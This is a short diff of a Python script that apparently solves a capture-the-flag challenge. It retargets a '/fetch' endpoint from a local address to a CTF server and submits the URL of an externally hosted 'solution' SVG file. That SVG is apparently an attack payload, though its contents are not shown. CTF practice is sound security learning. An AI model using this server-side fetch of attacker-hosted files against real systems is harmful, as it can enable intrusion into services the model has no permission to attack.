@@ -1,8 +1,10 @@
 import requests
 
 url = "http://192.168.64.2:5000/fetch"
+url = "http://nexus-security.club:8001/fetch"
+
 payload = {
-    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol6.svg"
+    "url": "https://raw.githubusercontent.com/Ilyeshaddad337/nexusctf/refs/heads/main/sol11.svg"
 }
 headers = {
     "Content-Type": "application/x-www-form-urlencoded"
